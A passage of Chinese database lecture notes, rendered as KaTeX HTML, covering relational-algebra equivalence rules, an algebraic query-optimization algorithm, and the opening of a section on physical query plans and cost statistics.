xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>−</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E=E_1-E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>是条件，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>−</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F}(E_1 - E_2)\equiv \sigma_F(E_1) - \sigma_F(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l10%3A%E6%8A%95%E5%BD%B1%E5%92%8C%E5%B9%B6%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L10:投影和并的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">E=E_1\cup E_2,A_1...A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>中的一些属性，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo>∪</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(E_1\cup E_2)\equiv \pi_{A_1..A_n}\cup \pi_{A_1..A_n}(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8057em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h3 id="2105-%E5%9F%BA%E4%BA%8E%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E7%9A%84%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%E5%8F%8A%E7%A4%BA%E4%BE%8B" tabindex="-1">2105 基于关系代数的查询优化算法及示例</h3><ul><li>算法：关系代数表达式的优化算法</li><li>input：一个关系代数表达式的语法树</li><li>output：计算该表达式的程序</li><li>method：<ul><li>依据定理L4,把形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub><mo>∧</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∧</mo><msub><mi>F</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F_1\wedge F_2\wedge ...\wedge F_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6807em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight">...</span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span></span></span></span></eq>的选择表达式变成串接形式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mi>n</mi></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F1}(\sigma_{F2}(...(\sigma_{Fn}(E))))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">...</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))))</span></span></span></span></eq></li><li>对每个选择，依据定理L4-L9，尽可能把它移动到树的底部</li><li>对每个投影，依据定理L3,7,10,5,尽可能的移到书的底部。如果一个投影是对表达式的所有属性进行的，则可以删去</li><li>依据定理L4，5把串接的选择和投影组合为单个选择，单个投影，或者一个选择后跟一个投影</li><li>对修改后的语法树，将其内节点按以下方式分组：<ul><li>每个二元运算节点和其所有的一元运算的直接祖先放在一组；对于所有的后代节点，若后代节点是一串一元运算且树叶为终点，则将这些一元运算节点放在改组中；如该二元运算节点是笛卡尔积，则其后代节点不能和它组合成连接，则不能将后代节点归入改组</li></ul></li><li>产生一个程序：它以每组节点为一步，但后代组先执行</li></ul></li></ul><h3 id="2106-%E7%89%A9%E7%90%86%E5%B1%82%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">2106 物理层查询优化</h3><h4 id="%EF%BC%881%EF%BC%89%E7%89%A9%E7%90%86%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E2%80%93%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF" tabindex="-1">（1）物理查询优化–总体思路</h4><ul><li><p>获取数据库的相关信息（定期统计）</p></li><li><p>实现同一关系操作的不同例行程序</p></li><li><p>选择相应的例行程序</p></li><li><p>依据相关信息进行代价估算，选择代价最少的例行程序及确定相应的参数</p></li><li><p>形成查询计划：以基本的例行程序为基本，确定这些例行程序的执行顺序</p></li><li><p>物理查询运算符</p><ul><li>获取关系元组的操作<ul><li>表空间扫描法</li><li>表空间扫描排序法</li><li>索引扫描法</li><li>索引扫描排序法</li></ul></li><li>关系操作的各种实现算法<ul><li>一趟算法，两趟算法</li><li>基于索引算法，基于散列算法，基于排序算法</li></ul></li><li>迭代器构造–流水化，物化</li></ul></li></ul><p>物理查询运算符通常是关系代数操作符的一个特定实现</p><h4 id="%EF%BC%882%EF%BC%89%E8%A1%A1%E9%87%8F%E4%B8%80%E4%B8%AA%E7%89%A9%E7%90%86%E6%9F%A5%E8%AF%A2%E8%AE%A1%E5%88%92" tabindex="-1">（2）衡量一个物理查询计划</h4><p>依据数据库中的一些统计信息–存放在数据字典或系统目录中的</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">T_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">T(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">B_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation 